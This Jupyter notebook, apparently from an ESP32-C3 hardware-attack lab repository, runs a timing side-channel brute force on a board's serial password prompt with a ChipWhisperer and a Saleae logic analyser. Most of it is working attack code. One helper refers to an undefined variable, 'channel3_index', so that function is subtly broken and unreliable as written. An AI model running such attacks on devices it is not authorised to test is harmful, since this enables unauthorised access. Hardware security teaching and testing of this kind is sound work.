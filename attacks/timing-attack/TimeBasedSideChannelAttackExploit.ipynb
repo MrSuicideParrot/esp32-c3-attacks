{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1727fb9b",
   "metadata": {},
   "source": [
    "# Timing attack\n",
    "\n",
    "In this attack we are going to attempt a side-channel attack against the serial interface of our target device. We are going to monitor the duration of time the device takes to answer a login attempt in the serial interface. If the time it takes is dependent on the correctness of our input, we will be able to brute-force each character of the password in separate.\n",
    "\n",
    "First, we need to initialize the chipwhisper nano that will be responsible for reseting the board whenever it is necessary and the serial connection."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a693742",
   "metadata": {},
   "outputs": [],
   "source": [
    "import chipwhisperer as cw\n",
    "import time \n",
    "\n",
    "try:\n",
    "    if not scope.connectStatus:\n",
    "        scope.con()\n",
    "except NameError:\n",
    "    scope = cw.scope()\n",
    "\n",
    "scope.default_setup()\n",
    "\n",
    "# Initialize the FT232H\n",
    "import serial\n",
    "ser = serial.Serial('/dev/ttyUSB0',baudrate=115200)\n",
    "\n",
    "# Function to reset the board\n",
    "def reset_board():\n",
    "    #Toggle reset\n",
    "    ser.reset_input_buffer()\n",
    "    scope.io.nrst = False\n",
    "    time.sleep(0.05)\n",
    "    scope.io.nrst = None #Pulls high by default\n",
    "    time.sleep(0.05)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d476efa7",
   "metadata": {},
   "source": [
    "If during the test we remove and reconect the chipwhisper to the computer, we should run  the following cell that will reconnect it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9a5d7d6b",
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "scope.con()\n",
    "scope"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "93048c58",
   "metadata": {},
   "source": [
    "The Salae logic analyser should be connected to the computer running this jupyter notebook, and the Logic 2 software should be running and with its remote API enabled.\n",
    "\n",
    "The following code configures the logic analyser via its remote API, it set two capture channels that should be defined according to your physicial connection, the sample rate of the capture and its duration (1 second)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f97df72d",
   "metadata": {},
   "outputs": [],
   "source": [
    "from saleae import automation\n",
    "\n",
    "# According to the target board\n",
    "# It should be configure according to your physical configuration.\n",
    "RX = 2\n",
    "TX = 3\n",
    "\n",
    "\n",
    "device_configuration = automation.LogicDeviceConfiguration(\n",
    "    enabled_digital_channels=[RX, TX], \n",
    "    digital_sample_rate=24_000_000,\n",
    ")\n",
    "\n",
    "capture_configuration = automation.CaptureConfiguration(\n",
    "    capture_mode=automation.TimedCaptureMode(duration_seconds=1)\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ed033608",
   "metadata": {},
   "source": [
    "The trace of the logic analyser is exported as a CSV file, imported to python as a pandas data frame and analysed by function `return_distance`. This function reads the logic trace and retrieves the time it took from receiving the authentication attempt and return the response."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "410f12e4",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "\n",
    "def return_distance(df: pd.DataFrame):\n",
    "    df_1 = df.iloc[::-1]\n",
    "    \n",
    "    channel_TX_timestamp = -1\n",
    "    channel_TX_index = -1\n",
    "    channel_RX_timestamp = -1\n",
    "    channel_RX_index = -1\n",
    "    \n",
    "    for index, row in df_1.iterrows():\n",
    "        if row[f'Channel {TX}'] == 0:\n",
    "            channel_TX_timestamp = row['Time [s]']\n",
    "            channel_TX_index = index\n",
    "            assert row[f'Channel {RX}'] == 1\n",
    "            break\n",
    "    \n",
    "    i = channel3_index\n",
    "    while True:\n",
    "        if df_1.loc[i][f'Channel {RX}'] == 0:\n",
    "            channel_RX_timestamp = df_1.loc[i]['Time [s]']\n",
    "            channel_RX_index = i\n",
    "            assert df_1.loc[i][f'Channel {TX}'] == 1\n",
    "            break\n",
    "        i += 1\n",
    "    \n",
    "    return channel_RX_timestamp - channel_TX_timestamp\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "99d09e1f",
   "metadata": {},
   "source": [
    "The next cell will preform a brute force attack to the password. We assume that at most the password has 18 chacratcers, and we test each character 4 times for each index. The time the microncontroller takes to answer to these attempts is measure and the mean of these 4 attempts is stored. Finally, we compared mean time it took to respond to each character and select the correct charcter for each index. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "645d2081",
   "metadata": {},
   "outputs": [],
   "source": [
    "from string import ascii_letters\n",
    "from statistics import mean\n",
    "import numpy\n",
    "import os\n",
    "\n",
    "possible_characters = ascii_letters\n",
    "\n",
    "# Folder where the Salae dumps will be stored\n",
    "capture_name = os.getcwd()+'/dumps'\n",
    "\n",
    "current_string = b\"\"\n",
    "found = False\n",
    "\n",
    "for _ in range(18):\n",
    "    results = []\n",
    "\n",
    "    for l in possible_characters:\n",
    "        tries = []\n",
    "        for _ in range(4):\n",
    "            with automation.Manager.connect( port=10430) as manager:\n",
    "\n",
    "                with manager.start_capture(\n",
    "                    device_configuration=device_configuration,\n",
    "                    capture_configuration=capture_configuration\n",
    "                ) as capture:\n",
    "                        reset_board()\n",
    "                        ser.read_until(b'Password:')\n",
    "                        ser.write(current_string+l.encode()+b\"\\n\")\n",
    "                        \n",
    "                        capture.wait()\n",
    "                        capture.export_raw_data_csv(capture_name,digital_channels=[2,3])\n",
    "                        \n",
    "                        if b'Correct password!' in ser.read_until(b'password!'):\n",
    "                            print(\"Correct password found!\")\n",
    "                            print(current_string+l.encode())\n",
    "                            found = True\n",
    "                            break\n",
    "                                      \n",
    "            # read and process the CSV\n",
    "            df = pd.read_csv(capture_name+'/digital.csv')\n",
    "            tries.append(return_distance(df))\n",
    "        \n",
    "        if found:\n",
    "            break\n",
    "        results.append(mean(tries))\n",
    "\n",
    "    \n",
    "    if found:\n",
    "        break\n",
    "    current_string += possible_characters[results.index(numpy.max(results))].encode()\n",
    "    \n",
    "    # Print partial password\n",
    "    print(current_string)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  },
  "vscode": {
   "interpreter": {
    "hash": "e7370f93d1d0cde622a1f8e1c04877d8463912d04d973331ad4851f04de6915a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
